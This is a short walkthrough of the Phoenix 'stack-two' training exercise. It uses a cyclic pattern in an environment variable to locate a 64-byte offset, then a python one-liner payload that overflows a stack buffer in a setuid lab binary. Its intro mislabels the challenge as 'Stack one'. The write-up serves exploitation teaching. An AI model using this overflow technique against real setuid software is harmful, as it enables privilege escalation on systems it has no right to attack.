# Stack Two
Stack one is the third challenge of the Phoenix exploitation set of challenges, it is available at https://exploit.education/

## Taking a first look at the binary
The binary name is `stack-two`, it has the setuid and setgid bit enabled which means it can be run as root with most users on the system

It has been compiled as a ELF 64-bit LSB (little endian) binary and is not stripped you can see by yourself by looking at the output of the following output :
```
$ file stack-two 1 ⨯  
stack-two: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x8  
6_64.so.1, not stripped
```

We also gonna check it with checksec just in case, it shouldn't be useful with this challenge but it's always a good practice to check if there's PIE/NX/ASLR/RELRO enabled on the executable
```
$ checksec stack-two  
[*] '/opt/phoenix/amd64/stack-two'  
   Arch:     amd64-64-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x400000)  
   RWX:      Has RWX segments  
   RPATH:    b'/opt/phoenix/x86_64-linux-musl/lib'
```
In this case everything seems disabled and we even have RWX segments, which means we could read, write and execute data in those segments, once again it's just the second challenge so i don't think it's going to be pretty useful.

## First Run
So we can now run our program, this way we'll see if we need to jump to GDB or if we can win the challenge without GDB
```
./stack-two   
Welcome to phoenix/stack-two, brought to you by https://exploit.education  
stack-two: please set the ExploitEducation environment variable
```

Wow, it looks similar to the challenges we just faced, it basically asks us to declare an environment variable called `ExploitEducation`, so we're going to set it using the following command
```
$ export ExploitEducation="pwn"
```

Next we can re run our program and see how it really works...
```
$ ./stack-two   
Welcome to phoenix/stack-two, brought to you by https://exploit.education  
Almost! changeme is currently 0x00000000, we want 0x0d0a090a
```

It is exactly like `stack-one` but this time it takes the value from an environment variable, let's generate a cyclic and put it in the ExploitEducation environment variable.
```
$ export ExploitEducation=$(cyclic 400)
```

Let's rerun our program and see if we did overwrite 0x00000000, and if so we're going to find that offset and put the right data on the stack
```
$ ./stack-two  
Welcome to phoenix/stack-two, brought to you by https://exploit.education  
Almost! changeme is currently 0x61616171, we want 0x0d0a090a
```

It's the exact same offset as `stack-one`, which leads me to think that `stack-two` uses the same buffer-size as `stack-one`, which was 64 bytes, let's confirm this
```
$ cyclic -l 0x61616171  
64
```

So let's write 64 bytes of padding and the expected value of 0x0d0a090a on the stack, don't forget that we need to write it using Little Endian Addressing so 0x0d0a090a will become 0x0a090a0d
```
$ export ExploitEducation=$(python3 -c 'print("A"*64 + "\x0a\x09\x0a\x0d")')
```

Then we can check if we successfully overwritten 0x0d0a090a on the stack with the data we want
```
$ /opt/phoenix/amd64/stack-two   
Welcome to phoenix/stack-two, brought to you by https://exploit.education  
Well done, you have successfully set changeme to the correct value
```

And we win the challenge, it was pretty much the same thing we did on stack-one, anyway time to pwn stack-three
